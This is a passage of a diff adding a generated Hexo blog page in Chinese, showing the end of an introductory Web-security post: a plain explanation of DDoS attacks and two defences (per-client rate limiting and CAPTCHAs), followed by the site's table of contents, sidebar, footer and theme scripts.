+<h3 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a>DDOS攻击</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>DDOS又称为分布式拒绝服务，全称是Distributed Denial of Service。DDOS是利用合理的请求造成资源过载，导致服务不可用。比如有一个停车场，可以停100辆车，但是有一天，有人搬了100块石头来把所有车位都占用了，那么停车场的车位就都<strong>不可用</strong>了。在安全领域中，拒绝服务攻击（Denial of Service）就是用来破坏网站的可用性的。</p>
+<h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><p>DDOS分为网络层DDOS和应用层DDOS,如今商业的Anti-DDOS设备，主要是对抗网络层的DDOS，而《白帽子讲Web安全》一书讲的主要是应用层的DDOS防御。</p>
+<h5 id="1-限制请求频率"><a href="#1-限制请求频率" class="headerlink" title="1. 限制请求频率"></a>1. 限制请求频率</h5><p>最常见的针对应用层DDOS攻击的防御措施，是在应用中，针对每个“客户端”做一个请求频率的限制。可以通过IP地址与Cookie定位一个客户端，如果客户端在一段时间内请求过于频繁，则对之后来自该客户端所有的请求都重定向到另一个错误页面。</p>
+<h5 id="2-验证码"><a href="#2-验证码" class="headerlink" title="2. 验证码"></a>2. 验证码</h5><p>验证码是互联网中的常用技术，可以有效阻止自动化重放的行为，因为脚本通常无法自动识别出验证码。但如果验证码设计得太复杂，使用户也无法识别，将会严重影响到用户的使用体验。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web安全入门"><span class="nav-number">1.</span> <span class="nav-text">Web安全入门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全三要素"><span class="nav-number">1.1.</span> <span class="nav-text">安全三要素</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#威胁分析"><span class="nav-number">1.2.</span> <span class="nav-text">威胁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web安全原则"><span class="nav-number">1.3.</span> <span class="nav-text">Web安全原则</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-黑名单、白名单原则"><span class="nav-number">1.3.1.</span> <span class="nav-text">1. 黑名单、白名单原则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-最小权限原则"><span class="nav-number">1.3.2.</span> <span class="nav-text">2. 最小权限原则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-数据与代码分离原则"><span class="nav-number">1.3.3.</span> <span class="nav-text">3. 数据与代码分离原则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-纵深防御原则"><span class="nav-number">1.3.4.</span> <span class="nav-text">4. 纵深防御原则</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见的Web攻击手段"><span class="nav-number">2.</span> <span class="nav-text">常见的Web攻击手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击"><span class="nav-number">2.1.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">2.1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS攻击的危害"><span class="nav-number">2.1.2.</span> <span class="nav-text">XSS攻击的危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御"><span class="nav-number">2.1.3.</span> <span class="nav-text">防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-HttpOnly"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">1. HttpOnly</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-输入检查"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">2. 输入检查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-对输出转义"><span class="nav-number">2.1.3.3.</span> <span class="nav-text">3. 对输出转义</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF攻击"><span class="nav-number">2.2.</span> <span class="nav-text">CSRF攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF攻击与Cookie"><span class="nav-number">2.2.2.</span> <span class="nav-text">CSRF攻击与Cookie</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF的防御"><span class="nav-number">2.2.3.</span> <span class="nav-text">CSRF的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-验证码"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">1. 验证码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-Anti-CSRF-Token"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">2. Anti CSRF Token</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入攻击"><span class="nav-number">2.3.</span> <span class="nav-text">注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">2.4.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#黑客如何利用文件上传漏洞"><span class="nav-number">2.4.2.</span> <span class="nav-text">黑客如何利用文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#设计安全的文件上传功能"><span class="nav-number">2.4.3.</span> <span class="nav-text">设计安全的文件上传功能</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-文件上传的目录设置为不可执行"><span class="nav-number">2.4.3.1.</span> <span class="nav-text">1. 文件上传的目录设置为不可执行</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-判断文件类型"><span class="nav-number">2.4.3.2.</span> <span class="nav-text">2. 判断文件类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-使用随机数改写文件和文件名路径"><span class="nav-number">2.4.3.3.</span> <span class="nav-text">3. 使用随机数改写文件和文件名路径</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DDOS攻击"><span class="nav-number">2.5.</span> <span class="nav-text">DDOS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介-4"><span class="nav-number">2.5.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御手段"><span class="nav-number">2.5.2.</span> <span class="nav-text">防御手段</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-限制请求频率"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">1. 限制请求频率</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-验证码"><span class="nav-number">2.5.2.2.</span> <span class="nav-text">2. 验证码</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lixiaoqin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lixiaoqin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
